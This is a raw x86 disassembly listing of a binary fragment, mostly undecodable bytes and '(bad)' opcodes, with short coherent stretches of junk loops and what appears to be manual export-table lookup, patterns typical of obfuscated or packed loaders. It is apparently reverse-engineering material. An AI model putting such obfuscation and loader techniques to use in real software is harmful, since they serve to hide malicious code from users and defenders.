  4140ed:	pop    edi
  4140ee:	ret    0x62de
  4140f1:	inc    esi
  4140f2:	mov    edx,0xec264a18
  4140f7:	xor    ebx,ebx
  4140f9:	xor    esp,DWORD PTR [esi+0xc]
  4140fc:	xchg   ebx,eax
  4140fd:	or     BYTE PTR [ecx+ebp*1-0x6b863afc],ah
  414104:	sub    al,0xff
  414106:	pop    es
  414107:	mov    DWORD PTR [ebx-0x39a0a6c3],eax
  41410d:	add    dl,dl
  41410f:	(bad)  
  414110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414111:	jle    0x4140cc
  414113:	mov    eax,0xda97fd2f
  414118:	ds jecxz 0x414195
  41411b:	jns    0x414141
  41411d:	(bad)  
  41411e:	je     0x4140c7
  414120:	fistp  WORD PTR [ecx+0x7527060a]
  414126:	xor    eax,0xb5b5457f
  41412b:	stos   BYTE PTR es:[edi],al
  41412c:	ja     0x4141aa
  41412e:	xor    dh,BYTE PTR gs:[ebx-0x253d7329]
  414135:	mov    ebx,0x96d8c212
  41413a:	push   es
  41413b:	sbb    BYTE PTR [edx],al
  41413d:	fcomp  DWORD PTR [ecx+0x49]
  414140:	push   ds
  414141:	mov    ebp,0x5b49a4aa
  414146:	mov    al,ds:0xdb495e96
  41414b:	test   al,0x73
  41414d:	xor    al,dl
  41414f:	push   0x3c
  414151:	sub    ebx,DWORD PTR [eax-0x3b754257]
  414157:	xor    DWORD PTR [edi-0x15],edi
  41415a:	sbb    BYTE PTR [esi+0x458b525f],dl
  414160:	in     al,dx
  414161:	and    DWORD PTR ds:0x42fcd5,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fcd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fcd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x41424a
  414283:	jbe    0x4142da
  414285:	mov    es,WORD PTR [eax-0x468f8f8d]
  41428b:	jle    0x4142fd
  41428d:	jo     0x414211
  41428f:	push   es
  414290:	sub    edx,esp
  414292:	ficomp WORD PTR [ebp+0x1cdc7400]
  414298:	pusha  
  414299:	dec    ebp
  41429a:	add    eax,0x6cbfd45
  41429f:	jle    0x4142a1
  4142a1:	ins    DWORD PTR es:[edi],dx
  4142a2:	adc    BYTE PTR [eax+0x646c816f],ah
  4142a8:	adc    DWORD PTR [edi+0x64],0x441300d4
  4142af:	or     eax,0x53ff182c
  4142b4:	jle    0x414280
  4142b6:	sbb    BYTE PTR [ebx-0x2a],0x70
  4142ba:	mov    al,0xbc
  4142bc:	sub    ecx,edi
  4142be:	xor    DWORD PTR [esi],0x12
  4142c1:	push   0xffffffaf
  4142c3:	inc    ecx
  4142c4:	aaa    
  4142c5:	mov    cl,0x47
  4142c7:	dec    ecx
  4142c8:	mov    ah,0xc8
  4142ca:	push   ebx
  4142cb:	(bad)  
  4142cc:	lods   eax,DWORD PTR ds:[esi]
  4142cd:	inc    edx
  4142ce:	retf   
  4142cf:	mov    ebp,0x4f2c1d70
  4142d4:	push   edx
  4142d5:	mov    eax,ds:0xca951e19
  4142da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142db:	pop    ebx
  4142dc:	lds    edi,FWORD PTR [edx+0x24]
  4142df:	js     0x4142f4
  4142e1:	fidivr WORD PTR [ecx+ecx*2+0x6f]
  4142e5:	enter  0xb9d9,0x2d
  4142e9:	pusha  
  4142ea:	popa   
  4142eb:	jb     0x4142d2
  4142ed:	cmp    ebp,DWORD PTR [edi-0x1f]
  4142f0:	aaa    
  4142f1:	loope  0x414347
  4142f3:	jp     0x41429f
  4142f5:	outs   dx,BYTE PTR ds:[esi]
  4142f6:	cli    
  4142f7:	fs jne 0x41428c
  4142fa:	rcl    ecx,cl
  4142fc:	lock cmp edi,edx
  4142ff:	cld    
  414300:	mov    ah,0x37
  414302:	test   DWORD PTR [edx+eiz*8+0x33],ecx
  414306:	jge    0x41430d
  414308:	adc    BYTE PTR [ecx+0x6e],bh
  41430b:	jmp    0x5953f320
  414310:	stos   DWORD PTR es:[edi],eax
  414311:	std    
  414312:	mov    ch,0x78
  414314:	adc    DWORD PTR ds:0x70d60f30,edi
  41431a:	push   edx
  41431b:	jp     0x41432a
  41431d:	pop    edx
  41431e:	xchg   ebx,edx
  414320:	int3   
  414321:	jns    0xaf01d9f8
  414327:	and    al,0xd6
  414329:	sub    al,al
  41432b:	ret    
  41432c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41432d:	icebp  
  41432e:	and    BYTE PTR [eax+ebp*2],0x2a
  414332:	mov    edx,eax
  414334:	call   0xb83:0xc6cc8972
  41433b:	aas    
  41433c:	hlt    
  41433d:	cmp    DWORD PTR [edx+0x31],esi
  414340:	rcr    DWORD PTR [esp+ebp*8+0x4c],0x82
  414345:	add    eax,0x87e73927
  41434a:	dec    ecx
  41434b:	in     eax,0xa0
  41434d:	loop   0x4142f2
  41434f:	mov    dl,dl
  414351:	stc    
  414352:	xor    DWORD PTR [ebx+0x70],ebp
  414355:	adc    BYTE PTR [esi+0x4a],dh
  414358:	jmp    FWORD PTR [esi+0x4e]
  41435b:	push   0x1c
  41435d:	jecxz  0x414333
  41435f:	and    ch,cl
  414361:	call   0xf333:0x2bb9c7e0
  414368:	add    al,0xba
  41436a:	repnz lods eax,DWORD PTR ds:[esi]
  41436c:	mul    ebp
  41436e:	or     BYTE PTR [ebx+0x6b5f37a0],bh
  414374:	fmul   st(3),st
  414376:	and    eax,0xca4188af
  41437b:	jno    0x41434f
  41437d:	push   0x5d4d4b3f
  414382:	jne    0x414304
  414384:	daa    
  414385:	aam    0x28
  414387:	sub    dl,BYTE PTR [eax-0x15]
  41438a:	js     0x414360
  41438c:	loope  0x41437e
  41438e:	cmp    edx,DWORD PTR [ebx-0x647b6672]
  414394:	inc    ebx
  414395:	out    dx,eax
  414396:	adc    ebp,DWORD PTR [ebp-0x65597d8d]
  41439c:	out    dx,al
  41439d:	repz (bad) 
  41439f:	das    
  4143a0:	fist   WORD PTR [ecx]
  4143a2:	hlt    
  4143a3:	ja     0x414357
  4143a5:	repnz or al,0x85
  4143a8:	call   0x34cc522f
  4143ad:	xlat   BYTE PTR ds:[ebx]
  4143ae:	pop    ds
  4143af:	fwait
  4143b0:	(bad)  
  4143b1:	cld    
  4143b2:	popa   
  4143b3:	add    ebx,DWORD PTR [ebx]
  4143b5:	add    ah,0x47
  4143b8:	in     eax,0x91
  4143ba:	xchg   ebx,eax
  4143bb:	pop    ebx
  4143bc:	ret    
  4143bd:	sbb    eax,0x22b99864
  4143c2:	daa    
  4143c3:	inc    esp
  4143c4:	or     eax,0xf37d5c4f
  4143c9:	enter  0x9176,0x1d
  4143cd:	sbb    DWORD PTR [edi],esi
  4143cf:	jle    0x414363
  4143d1:	mov    eax,0x6293ce6e
  4143d6:	lods   eax,DWORD PTR ds:[esi]
  4143d7:	pop    esi
  4143d8:	jns    0x414411
  4143da:	pop    esi
  4143db:	or     al,0x5b
  4143dd:	ins    DWORD PTR es:[edi],dx
  4143de:	mov    ch,0x79
  4143e0:	push   0xfffffff9
  4143e2:	loopne 0x4143ed
  4143e4:	or     BYTE PTR [eax+0xe6ed71d],al
  4143ea:	loopne 0x41444f
  4143ec:	mov    eax,ds:0x85499f71
  4143f1:	pop    es
  4143f2:	rcl    DWORD PTR [esi+0x7c0a77df],1
  4143f8:	pop    ds
  4143f9:	enter  0x9ec5,0xbd
  4143fd:	stos   DWORD PTR es:[edi],eax
  4143fe:	add    DWORD PTR [edi-0x22],ecx
  414401:	sub    ah,BYTE PTR [eax-0x19abd3e8]
  414407:	mov    ds:0x4846c3e2,eax
  41440c:	int3   
  41440d:	push   edx
  41440e:	pop    esp
  41440f:	xchg   edx,eax
  414410:	pop    ebp
  414411:	mov    dl,BYTE PTR [ebp-0x73]
  414414:	out    0x65,al
  414416:	fnstenv [esp+edi*4]
  414419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41441a:	xchg   ecx,eax
  41441b:	inc    edx
  41441c:	scas   eax,DWORD PTR es:[edi]
  41441d:	adc    al,0x80
  41441f:	leave  
  414420:	dec    edi
  414421:	adc    al,0xcb
  414423:	imul   esp,DWORD PTR [ecx-0x11],0xffffffaa
  414427:	pop    ss
  414428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414429:	add    al,0x5
  41442b:	loopne 0x4143bb
  41442d:	push   edx
  41442e:	lea    esi,[edx+0x7f]
  414431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414432:	and    DWORD PTR [edx+esi*1],edi
  414435:	jmp    0xb374c558
  41443a:	jno    0x4144af
  41443c:	mov    edi,0x21644518
  414441:	int    0x59
  414443:	ds cs adc cl,bh
  414447:	xchg   ebp,eax
  414448:	cmp    ebp,DWORD PTR [ebx-0x7]
  41444b:	fld    DWORD PTR [edi+0x49fe50bf]
  414451:	xor    eax,0x4699dd71
  414456:	inc    ebp
  414457:	inc    edi
  414458:	out    0xc4,eax
  41445a:	sbb    eax,0x82eac6f3
  41445f:	dec    ecx
  414460:	cmp    ah,BYTE PTR ds:0x89ac5118
  414466:	mov    ecx,0xb8fa618d
  41446b:	sar    BYTE PTR [edi+0x5bc7a07a],1
  414471:	adc    al,ah
  414473:	dec    esp
  414474:	pop    es
  414475:	pop    esi
  414476:	mov    ebp,0x1768575b
  41447b:	dec    eax
  41447c:	sbb    al,0x7
  41447e:	repnz adc bl,bl
  414481:	mov    eax,0xd972234e
  414486:	clc    
  414487:	inc    edi
  414488:	(bad)  
  414489:	call   0x7c9f6b48
  41448e:	dec    ecx
  41448f:	cli    
  414490:	lea    esp,[esi+0x1f3ea65]
  414496:	mov    eax,0x27f12eb9
  41449b:	sti    
  41449c:	ror    cl,cl
  41449e:	push   0xffffffed
  4144a0:	xchg   esi,eax
  4144a1:	in     al,0x9c
  4144a3:	inc    esp
  4144a4:	mov    eax,0xa8f72c40
  4144a9:	or     eax,0x3f0569b
  4144ae:	cmp    eax,0x9ca2a02b
  4144b3:	lods   al,BYTE PTR ds:[esi]
  4144b4:	mov    ?,ebp
  4144b6:	int    0xf9
  4144b8:	lea    ebp,[edi-0x6dacb49b]
  4144be:	push   ebp
  4144bf:	out    0xd5,al
  4144c1:	sub    DWORD PTR [esi+0x63],0x17
  4144c5:	inc    edi
  4144c6:	in     eax,dx
  4144c7:	and    BYTE PTR [edi],bh
  4144c9:	test   ch,cl
  4144cb:	jmp    0x4144b3
  4144cd:	xchg   ax,ax
  4144cf:	sahf   
  4144d0:	push   ebp
  4144d1:	and    al,0x81
  4144d3:	rcl    DWORD PTR [ebx+edi*1-0x1ba3ef3c],1
  4144da:	dec    ebx
  4144db:	dec    edx
  4144dc:	(bad)  
  4144dd:	pop    ecx
  4144de:	fist   DWORD PTR [ecx+0x21dc88c3]
  4144e4:	out    dx,eax
  4144e5:	icebp  
  4144e6:	sahf   
  4144e7:	push   es
  4144e8:	cmp    bx,cx
  4144eb:	dec    esp
  4144ec:	mov    eax,0x377359b1
  4144f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144f2:	ins    DWORD PTR es:[edi],dx
  4144f3:	scas   al,BYTE PTR es:[edi]
  4144f4:	aad    0xd9
  4144f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144f7:	retf   0xbafc
  4144fa:	pop    esp
  4144fb:	add    esp,ecx
  4144fd:	sbb    edi,DWORD PTR [edi+ecx*4-0x35]
  414501:	or     edi,DWORD PTR [eax+0x21]
  414504:	mov    edx,ebp
  414506:	popa   
  414507:	dec    esi
  414508:	shr    BYTE PTR [ebx+0xb3594c2],1
  41450e:	adc    ah,ah
  414510:	jmp    0x4424:0xc0768806
  414517:	inc    ebx
  414518:	(bad)
  41451c:	sbb    eax,DWORD PTR [ebx]
  41451e:	xchg   ebp,eax
  41451f:	rol    BYTE PTR [esi],1
  414521:	add    ebp,eax
  414523:	bound  edx,QWORD PTR [ebx-0x337ef3c1]
  414529:	inc    edx
  41452a:	mov    al,ds:0x6633520c
  41452f:	outs   dx,BYTE PTR ds:[esi]
  414530:	xor    DWORD PTR [edi+0xd],0xd969a0eb
  414537:	xchg   ebx,eax
  414538:	add    edx,DWORD PTR [ecx-0x1b]
  41453b:	sbb    esi,DWORD PTR [edi-0x77bda09]
  414541:	xor    eax,0x39382f18
  414546:	loope  0x4145c3
  414548:	dec    ebp
  414549:	js     0x4144e6
  41454b:	clc    
  41454c:	fwait
  41454d:	jmp    0x4144d3
  41454f:	adc    al,0x1b
  414551:	and    DWORD PTR [esi+0x75ff86ad],esi
  414557:	sar    bh,1
  414559:	jne    0x414567
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0x22f1beb4
  414576:	inc    edi
  414577:	fcmove st,st(1)
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x414545
  414581:	(bad)  
  414582:	jmp    0xc1b62058
  414587:	fucomp st(3)
  414589:	push   edx
  41458a:	or     BYTE PTR [ebp+0x1c],dh
  41458d:	int    0x95
  41458f:	push   cs
  414590:	sbb    ah,bh
  414592:	sar    DWORD PTR [ecx],0x78
  414595:	sub    esi,DWORD PTR [ebx+0x13]
  414598:	sbb    eax,0x6a205bd7
  41459d:	xchg   ebp,eax
  41459e:	dec    ebx
  41459f:	sahf   
  4145a0:	cmp    al,0x6a
  4145a2:	scas   eax,DWORD PTR es:[edi]
  4145a3:	mov    ds,WORD PTR [eax+esi*8+0x5e]
  4145a7:	inc    edi
  4145a8:	sbb    al,0xe5
  4145aa:	mov    ecx,0xd1b2c4a5
  4145af:	popf   
  4145b0:	data16 ds sbb al,0x3d
  4145b4:	sub    eax,0xed3b8a84
  4145b9:	gs inc esp
  4145bb:	mov    ch,0x96
  4145bd:	fadd   QWORD PTR [ebp-0x65]
  4145c0:	mov    dl,bh
  4145c2:	adc    ecx,DWORD PTR [edx+0x3a]
  4145c5:	adc    bl,BYTE PTR [esi-0x262107ad]
  4145cb:	sub    ah,BYTE PTR [ebp-0x1c56f796]
  4145d1:	jle    0x4145f0
  4145d3:	pop    ebx
  4145d4:	lahf   
  4145d5:	(bad)  
  4145d6:	xchg   ebx,eax
  4145d7:	rcr    BYTE PTR [esi],1
  4145d9:	jno    0x4145bb
  4145db:	or     dh,BYTE PTR [ecx]
  4145dd:	test   al,0x57
  4145df:	faddp  st(0),st
  4145e1:	ins    BYTE PTR es:[edi],dx
  4145e2:	mov    ds:0x90e7532f,eax
  4145e7:	mov    ch,0x4b
  4145e9:	adc    dl,BYTE PTR [eax+eax*2-0x4ea9caa5]
  4145f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145f1:	jecxz  0x41457f
  4145f3:	push   esp
  4145f4:	push   0xffffffce
  4145f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145f7:	mov    WORD PTR [esi],gs
  4145f9:	mov    bl,0xe1
  4145fb:	mov    gs,ebx
  4145fd:	and    BYTE PTR [esi+0x434a2e44],al
  414603:	or     ah,BYTE PTR [ecx]
  414605:	sub    ch,BYTE PTR [edx-0x73]
  414608:	or     al,0xde
  41460a:	std    
  41460b:	inc    esp
  41460c:	xchg   edi,eax
  41460d:	ret    
  41460e:	ins    BYTE PTR es:[edi],dx
  41460f:	jp     0x414653
  414611:	xor    al,0x11
  414613:	push   esp
  414614:	push   0x7b51300b
  414619:	pop    DWORD PTR [ebx+0x22]
  41461c:	(bad)  
  41461d:	stc    
  41461e:	jg     0x4145d3
  414620:	mov    ebx,0x5332ace4
  414625:	add    al,0x13
  414627:	cmp    eax,0xa66fbf8e
  41462c:	jmp    0x8a2b:0x18938cbf
  414633:	test   eax,0x3874b87c
  414638:	push   esp
  414639:	(bad)  
  41463a:	scas   eax,DWORD PTR es:[edi]
  41463b:	pop    eax
  41463c:	rcr    DWORD PTR [edi-0x6532377c],1
  414642:	std    
  414643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414644:	mov    es,WORD PTR [ebp+0x3e]
  414647:	cmp    al,0x92
  414649:	jmp    0x414641
  41464b:	add    al,BYTE PTR [ebp-0xb]
  41464e:	pop    eax
  41464f:	pop    edx
  414650:	add    BYTE PTR [ebx-0x32ca7971],bl
  414656:	inc    edx
  414657:	leave  
  414658:	out    0x7,eax
  41465a:	cdq    
  41465b:	mov    ebx,0xfdd6cf5f
  414660:	and    eax,0xc2382894
  414665:	pop    ebp
  414666:	lods   al,BYTE PTR cs:[esi]
  414668:	cmp    al,0x1a
  41466a:	test   DWORD PTR [ebx-0x39418fe7],0x2e4fdec9
  414674:	popf   
  414675:	(bad)  
  414677:	sbb    al,0x9d
  414679:	dec    esp
  41467a:	jmp    0x414612
  41467c:	and    dh,BYTE PTR [ebp+0x53eb2cb7]
  414682:	or     ch,BYTE PTR [ebx+0x19c5ca6c]
  414688:	into   
  414689:	bound  ebx,QWORD PTR [ebx-0x33]
  41468c:	neg    BYTE PTR [eax-0x13]
  41468f:	call   FWORD PTR [ecx-0x1131ffd2]
  414695:	mov    bh,0xb7
  414697:	mov    ds:0xdd1e2e4b,eax
  41469c:	mov    edx,0xd4b0f5ee
  4146a1:	cmc    
  4146a2:	sbb    ch,BYTE PTR [esi+0x5efb1585]
  4146a8:	out    dx,eax
  4146a9:	inc    BYTE PTR [eax-0x11c67f77]
  4146af:	xlat   BYTE PTR ds:[ebx]
  4146b0:	mul    BYTE PTR [ebx+eiz*1+0x3b]
  4146b4:	inc    ebp
  4146b5:	or     eax,0x7fea67d0
  4146ba:	ror    DWORD PTR [edi],0xb6
  4146bd:	cld    
  4146be:	div    BYTE PTR [ebx+0x4f0c369e]
  4146c4:	(bad)  
  4146c5:	loope  0x41466a
  4146c7:	lock cs dec ebx
  4146ca:	push   ebx
  4146cb:	inc    eax
  4146cc:	fs stc 
  4146ce:	or     al,0x5
  4146d0:	pop    ecx
  4146d1:	cld    
  4146d2:	xor    BYTE PTR [esi+0x56],cl
  4146d5:	fcomip st,st(7)
  4146d7:	in     al,dx
  4146d8:	jmp    0xb3c657b
  4146dd:	(bad)  
  4146de:	je     0x414743
  4146e0:	adc    cl,BYTE PTR [eax+0x41]
  4146e3:	dec    ebx
  4146e4:	(bad)  
  4146e5:	cmc    
  4146e6:	pop    edi
  4146e7:	xor    DWORD PTR [eax+esi*1+0x68d27e81],ebp
  4146ee:	sbb    al,BYTE PTR [edx]
  4146f0:	popf   
  4146f1:	lods   eax,DWORD PTR ds:[esi]
  4146f2:	sub    ch,BYTE PTR [ebx]
  4146f4:	lahf   
  4146f5:	dec    ecx
  4146f6:	shl    DWORD PTR [edi],1
  4146f8:	cld    
  4146f9:	cli    
  4146fa:	mov    ch,0x2
  4146fc:	(bad)  
  4146fd:	shl    edx,cl
  4146ff:	imul   eax,DWORD PTR [esi-0x5f],0xffffffb1
  414703:	cmp    BYTE PTR [esi+0x2164dc9],cl
  414709:	outs   dx,BYTE PTR ds:[esi]
  41470a:	pop    esi
  41470b:	jnp    0x4146a9
  41470d:	jecxz  0x4146b2
  41470f:	rcl    DWORD PTR [ecx-0x537a249],0x24
  414716:	push   es
  414717:	daa    
  414718:	stos   DWORD PTR es:[edi],eax
  414719:	dec    edi
  41471a:	jae    0x4146d7
  41471c:	jne    0x414729
  41471e:	pop    ebp
  41471f:	xchg   ebp,eax
  414720:	es dec eax
  414722:	push   ecx
  414723:	aam    0x32
  414725:	xor    al,0xf6
  414727:	mov    DWORD PTR [ecx],ecx
  414729:	push   es
  41472a:	jae    0x414719
  41472c:	or     al,0x8a
  41472e:	scas   al,BYTE PTR es:[edi]
  41472f:	sbb    DWORD PTR [eax],eax
  414731:	icebp  
  414732:	pop    esp
  414733:	mov    ebx,0xc8d4a708
  414738:	sahf   
  414739:	adc    esi,DWORD PTR [edx]
  41473b:	aas    
  41473c:	aam    0x8d
  41473e:	iret   
  41473f:	scas   al,BYTE PTR es:[edi]
  414740:	inc    ebx
  414741:	push   ss
  414742:	mov    al,ds:0x32d9c98c
  414747:	loop   0x4146fc
  414749:	cdq    
  41474a:	lds    edx,FWORD PTR [edx+0x17e1869e]
  414750:	mov    esi,0xfff02572
  414755:	mov    dl,0x73
  414757:	mov    al,0x26
  414759:	cmp    cl,bh
  41475b:	adc    al,0xd1
  41475d:	xor    eax,0x97b23bcd
  414762:	and    BYTE PTR [eax+0x56a1d308],bh
  414768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414769:	dec    edi
  41476a:	adc    BYTE PTR [ecx+0x1072cd15],dh
  414770:	dec    ebx
  414771:	push   ds
  414772:	leave  
  414773:	push   es
  414774:	pop    esi
  414775:	fucom  st(7)
  414777:	stos   BYTE PTR es:[edi],al
  414778:	ret    
  414779:	out    dx,eax
  41477a:	retf   0xaa2d
  41477d:	or     al,bh
  41477f:	in     eax,0x6
  414781:	repnz and ebx,DWORD PTR [ebx]
  414784:	pop    ebx
  414785:	(bad)  
  414786:	push   ds
  414787:	dec    esp
  414788:	xchg   esp,eax
  414789:	sbb    DWORD PTR [edi+0x31],ebx
  41478c:	(bad)
  414790:	jle    0x4147dc
  414792:	jbe    0x41472d
  414794:	call   0xa0296443
  414799:	ss das 
  41479b:	push   ss
  41479c:	shr    BYTE PTR cs:[esi-0x64b74f49],cl
  4147a3:	std    
  4147a4:	or     BYTE PTR [esi-0x1bfffe0d],al
  4147aa:	aaa    
  4147ab:	loopne 0x41478d
  4147ad:	lahf   
  4147ae:	adc    esi,ecx
  4147b0:	loope  0x4147a6
  4147b2:	mov    ch,0x2d
  4147b4:	adc    eax,0xad682640
  4147b9:	jne    0x4147aa
  4147bb:	aas    
  4147bc:	cmp    DWORD PTR [edi-0x4d2f2741],edi
  4147c2:	mov    ebx,0x9c9a9fdd
  4147c7:	retf   
  4147c8:	out    dx,al
  4147c9:	bound  ecx,QWORD PTR [edx]
  4147cb:	jge    0x41479b
  4147cd:	cld    
  4147ce:	fstp   st(2)
  4147d0:	cmp    eax,DWORD PTR [edx]
  4147d2:	cld    
  4147d3:	dec    ecx
  4147d4:	into   
  4147d5:	daa    
  4147d6:	mov    ss,WORD PTR [eax+0x31678572]
  4147dc:	mov    bh,0x1a
  4147de:	push   edi
  4147df:	in     al,dx
  4147e0:	mov    esp,0x98826467
  4147e5:	(bad)
  4147e9:	repz test BYTE PTR ss:[ecx+0x709585c6],bh
  4147f1:	inc    ecx
  4147f2:	std    
  4147f3:	or     eax,DWORD PTR [ebp+0xb]
  4147f6:	outs   dx,BYTE PTR ds:[esi]
  4147f7:	pop    edx
  4147f8:	sahf   
  4147f9:	sar    BYTE PTR [ebx-0x3e],cl
  4147fc:	push   ss
  4147fd:	int3   
  4147fe:	aaa    
  4147ff:	add    al,BYTE PTR [ebp-0x7d6c3247]
  414805:	sbb    ch,dh
  414807:	in     al,0x4a
  414809:	mov    eax,0xcbe367c3
  41480e:	fs or  al,0x1f
  414812:	cmc    
  414813:	xor    al,0x21
  414815:	and    eax,0x58010db5
  41481a:	mov    ds:0xffca5589,al
  41481f:	or     esp,ebx
  414821:	daa    
  414822:	test   eax,0x2dc6cb75
  414827:	xor    eax,0x4342b796
  41482c:	pusha  
  41482d:	pop    ebp
  41482e:	daa    
  41482f:	inc    ebx
  414830:	sbb    BYTE PTR [ecx-0x50c6ef55],ah
  414836:	push   ds
  414837:	push   edx
  414838:	sahf   
  414839:	in     al,dx
  41483a:	outs   dx,DWORD PTR ds:[esi]
  41483b:	dec    edx
  41483c:	sub    cl,0x71
  41483f:	mov    ch,0x76
  414841:	sbb    BYTE PTR [eax+0x58],bl
  414844:	xor    ecx,DWORD PTR [edi+0xf]
  414847:	mov    ecx,DWORD PTR [ebp-0x8]
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x414898
  414861:	dec    edx
  414862:	cmp    eax,0x7f7d12e9
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x414818
  41486d:	ret    
  41486e:	outs   dx,DWORD PTR ds:[esi]
  41486f:	xor    ah,BYTE PTR [ebp-0x23]
  414872:	jp     0x4147ff
  414874:	adc    eax,0xccc7f173
  414879:	push   ds
  41487a:	gs ret 
  41487c:	jp     0x4148f2
  41487e:	ret    0x93e5
  414881:	mov    BYTE PTR [eax+0x44ec263d],al
  414887:	(bad)  
  414888:	scas   al,BYTE PTR es:[edi]
  414889:	icebp  
  41488a:	dec    ecx
  41488b:	stos   DWORD PTR es:[edi],eax
  41488c:	jo     0x4148a2
  41488e:	retf   0x7aca
  414891:	dec    edi
  414892:	xor    ebx,DWORD PTR [ecx]
  414894:	and    DWORD PTR [ebx],edi
  414896:	push   esi
  414897:	fbld   TBYTE PTR [ebx+edx*4-0x5e]
  41489b:	cs hlt 
  41489d:	(bad)  
  41489e:	jae    0x4148d5
  4148a0:	jl     0x4148d9
  4148a2:	(bad)  
  4148a3:	jmp    FWORD PTR [ecx]
  4148a5:	jmp    0x8683:0x83b60336
  4148ac:	cmp    edx,esi
  4148ae:	pushf  
  4148af:	pop    es
  4148b0:	(bad)  
  4148b2:	in     al,dx
  4148b3:	pop    ss
  4148b4:	shr    BYTE PTR [eax+0x25],cl
  4148b7:	or     BYTE PTR [edi+0xa],0xa8
  4148bb:	adc    BYTE PTR [edi],al
  4148bd:	lock rcl DWORD PTR [edx-0x69],0x59
  4148c2:	retf   
  4148c3:	push   eax
  4148c4:	push   es
  4148c5:	rcr    BYTE PTR [eax-0x2d],0x7f
  4148c9:	jno    0x41485a
  4148cb:	aam    0x9
  4148cd:	jno    0x4148ca
  4148cf:	mov    bl,0x0
  4148d1:	add    esp,DWORD PTR [esi+0x70]
  4148d4:	xchg   DWORD PTR [edi-0x1d99d09d],ebx
  4148da:	out    dx,al
  4148db:	mov    dh,0x68
  4148dd:	add    eax,DWORD PTR [edx]
  4148df:	pusha  
  4148e0:	xchg   DWORD PTR [esi],esi
  4148e2:	cmp    eax,ecx
  4148e4:	mov    ah,0x43
  4148e6:	push   cs
  4148e7:	push   0x13
  4148e9:	sbb    DWORD PTR [esi],0xffffffee
  4148ec:	(bad)
  4148ef:	mov    esp,0x4409c941
  4148f4:	mov    dl,0x57
  4148f6:	sub    BYTE PTR [edi],al
  4148f8:	iret   
  4148f9:	out    0x51,al
  4148fb:	sahf   
  4148fc:	(bad)  
  4148fd:	(bad)  
  4148fe:	fnstenv [edx+ecx*4-0x26]
  414902:	pusha  
  414903:	cmc    
  414904:	mov    ebp,0xb034ebcb
  414909:	xchg   esi,eax
